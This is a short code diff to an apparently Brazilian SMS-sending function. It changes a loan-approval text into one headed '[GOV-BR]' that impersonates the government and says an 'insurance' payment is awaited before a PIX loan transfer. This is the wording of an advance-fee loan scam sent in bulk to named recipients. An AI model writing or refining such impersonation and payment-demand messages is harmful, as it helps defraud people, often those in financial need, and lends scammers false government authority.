@@ -286,7 +286,7 @@ def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
             return False
 
         # Message template
-        message = f"[PROGRAMA CREDITO DO TRABALHADOR] {first_name}, seu empréstimo de R${amount:.2f} foi aprovado! Finalize o processo para receber via PIX instantaneamente."
+        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."
 
         # Choose which API to use based on SMS_API_CHOICE
         if SMS_API_CHOICE.upper() == 'OWEN':
